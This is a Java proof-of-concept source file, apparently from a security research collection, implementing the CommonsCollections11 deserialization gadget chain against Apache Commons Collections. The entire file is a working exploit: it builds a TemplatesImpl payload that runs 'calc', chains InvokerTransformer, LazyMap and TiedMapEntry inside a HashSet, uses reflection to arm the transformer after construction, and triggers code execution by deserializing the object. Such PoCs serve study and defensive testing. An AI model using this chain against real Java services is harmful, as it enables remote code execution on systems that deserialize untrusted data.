package com.javasec.pocs.cc;

import com.javasec.utils.SerializeUtils;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

public class CommonsCollections11ver1 {
    public static void main(String[] args) throws Exception {
        Templates templates = SerializeUtils.getTemplate("calc");
        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = SerializeUtils.MakeHashSet(tiedmap);
        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");
        SerializeUtils.base64deserial(SerializeUtils.base64serial(hashset));
    }
}
